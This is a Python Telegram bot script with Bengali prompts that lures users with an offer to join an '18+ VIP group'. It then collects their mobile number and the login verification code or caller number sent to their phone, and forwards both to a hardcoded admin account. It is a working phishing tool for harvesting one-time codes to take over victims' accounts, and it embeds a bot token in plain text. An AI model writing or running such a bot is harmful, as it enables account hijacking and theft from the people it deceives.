from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
)
from datetime import datetime

# --- Conversation Step Numbers ---
ASK_PHONE, ASK_CODE = range(2)

# --- তোমার Telegram Bot Token ---
BOT_TOKEN = "8108498513:AAE07KwMa5MkiBQbn7ZDsDsSFyAH69C_uGc"

# --- তোমার Telegram Admin ID ---
ADMIN_ID = 6588434606

# --- /start command handler ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [["হ্যাঁ", "না"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    await update.message.reply_text(
        "আপনি কি আমাদের ১৮+ VIP গ্রুপে যুক্ত হতে চান?", reply_markup=reply_markup
    )
    return ASK_PHONE

# --- ইউজারের ফোন নাম্বার চাওয়া ---
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "হ্যাঁ":
        await update.message.reply_text("আপনার মোবাইল নাম্বার দিন:")
        return ASK_CODE
    else:
        await update.message.reply_text("ঠিক আছে, ধন্যবাদ।")
        return ConversationHandler.END

# --- ইউজারের কোড/কল নাম্বার নেওয়া ---
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['phone'] = phone

    await update.message.reply_text(
        "আপনার মোবাইলে একটি কোড যাবে অথবা একটি কল আসবে।\n"
        "যদি কোড আসে তাহলে কোডটি দিন, আর যদি কল আসে তাহলে যে নাম্বার থেকে কল আসবে সেটি দিন।"
    )
    return_code_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, collect_data)
    context.application.add_handler(return_code_handler, 1)
    return 2

# --- ইউজারের দেওয়া ডেটা এডমিনকে পাঠানো ---
async def collect_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code_or_call = update.message.text
    phone = context.user_data.get('phone', 'পাওয়া যায়নি')

    message = (
        f"📥 নতুন ১৮+ VIP রিকোয়েস্ট\n"
        f"📞 নাম্বার: {phone}\n"
        f"🔑 কোড/কল নাম্বার: {code_or_call}\n"
        f"🕒 সময়: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

    await context.bot.send_message(chat_id=ADMIN_ID, text=message)
    await update.message.reply_text("ধন্যবাদ! অনুগ্রহ করে অপেক্ষা করুন, আপনাকে আমাদের ১৮+ VIP গ্রুপে যুক্ত করা হবে।")
    return ConversationHandler.END

# --- /cancel command ---
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("আপনার অনুরোধ বাতিল করা হয়েছে।")
    return ConversationHandler.END

# --- বট চালু করার কোড ---
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == '__main__':
    main()
